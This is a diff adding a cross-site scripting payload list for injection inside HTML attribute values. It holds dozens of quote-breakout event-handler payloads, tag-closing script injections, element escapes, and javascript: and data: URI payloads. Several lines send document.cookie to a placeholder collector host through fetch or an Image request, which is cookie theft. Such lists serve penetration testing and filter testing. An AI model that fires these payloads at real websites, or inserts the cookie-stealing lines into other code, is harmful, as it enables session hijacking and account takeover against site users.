@@ -1,0 +1,108 @@
+# XSS Payloads: Attribute Context
+# Use when input is injected inside an HTML attribute value
+
+# --- Breakout from double-quoted attribute ---
+" onfocus=alert(document.domain) autofocus="
+" onfocus=alert(document.domain) autofocus tabindex=1 "
+" onfocusin=alert(document.domain) autofocus="
+" onmouseover=alert(document.domain) "
+" onmouseout=alert(document.domain) "
+" onmousedown=alert(document.domain) "
+" onmouseup=alert(document.domain) "
+" onmousemove=alert(document.domain) "
+" onclick=alert(document.domain) "
+" ondblclick=alert(document.domain) "
+" onkeydown=alert(document.domain) "
+" onkeypress=alert(document.domain) "
+" onkeyup=alert(document.domain) "
+" onchange=alert(document.domain) "
+" onblur=alert(document.domain) "
+" onsubmit=alert(document.domain) "
+" onreset=alert(document.domain) "
+" onscroll=alert(document.domain) autofocus tabindex=1 "
+" ontoggle=alert(document.domain) "
+" onerror=alert(document.domain) "
+" onload=alert(document.domain) "
+" onplay=alert(document.domain) "
+" onpause=alert(document.domain) "
+" onpointerdown=alert(document.domain) "
+" onpointerup=alert(document.domain) "
+" onpointermove=alert(document.domain) "
+" onpointerenter=alert(document.domain) "
+" onwheel=alert(document.domain) "
+" onsearch=alert(document.domain) "
+" oncopy=alert(document.domain) "
+" oncut=alert(document.domain) "
+" onpaste=alert(document.domain) "
+" onauxclick=alert(document.domain) "
+" oncontextmenu=alert(document.domain) "
+" ondrag=alert(document.domain) "
+" ondrop=alert(document.domain) "
+" onanimationend=alert(document.domain) "
+" onanimationstart=alert(document.domain) "
+" ontransitionend=alert(document.domain) "
+" onfullscreenchange=alert(document.domain) "
+" autofocus onfocus=alert(document.domain) x="
+
+# --- Breakout from single-quoted attribute ---
+' onfocus=alert(document.domain) autofocus='
+' onfocus=alert(document.domain) autofocus tabindex=1 '
+' onmouseover=alert(document.domain) '
+' onclick=alert(document.domain) '
+' autofocus onfocus=alert(document.domain) x='
+
+# --- Breakout from backtick (template literal) attribute ---
+` onfocus=alert(document.domain) autofocus=`
+` onmouseover=alert(document.domain) `
+` autofocus onfocus=alert(document.domain) x=`
+
+# --- Close tag then inject ---
+"><script>alert(document.domain)</script>
+"><img src=x onerror=alert(document.domain)>
+"><svg onload=alert(document.domain)>
+"><input autofocus onfocus=alert(document.domain)>
+"><details open ontoggle=alert(document.domain)>
+"><body onload=alert(document.domain)>
+"><iframe onload=alert(document.domain)>
+"><video><source onerror=alert(document.domain)>
+
+#'><script>alert(document.domain)</script>
+#'><img src=x onerror=alert(document.domain)>
+#'><svg onload=alert(document.domain)>
+
+`><script>alert(document.domain)</script>
+`><img src=x onerror=alert(document.domain)>
+`><svg onload=alert(document.domain)>
+
+# --- Close tag first (if inside <textarea>/<title>/<style>/<script>) ---
+</textarea><script>alert(document.domain)</script>
+</title><script>alert(document.domain)</script>
+</style><script>alert(document.domain)</script>
+</script><script>alert(document.domain)</script>
+</noscript><img src=x onerror=alert(document.domain)>
+</xmp><script>alert(document.domain)</script>
+
+# --- Space-less attribute breakouts ---
+"onfocus=alert(1) autofocus
+'onfocus=alert(1) autofocus
+"onmouseover=alert(1)
+'autofocus onfocus=alert(1)
+
+# --- `href` attribute injection ---
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+javascript:confirm('XSS')
+javascript:prompt('XSS')
+javascript:fetch('//COLLECTOR/?c='+document.cookie)
+javascript:eval(atob('YWxlcnQoMSk='))
+javascript:new Image().src='//COLLECTOR/?c='+document.cookie
+javascript:this.constructor.constructor('alert(document.domain)')()
+
+# --- `action`/`formaction` injection ---
+javascript:alert(document.domain)
+javascript:fetch('//COLLECTOR/?c='+document.cookie)
+
+# --- `src` attribute injection ---
+javascript:alert(document.domain)
+data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
+data:text/html,<script>alert(document.domain)</script>
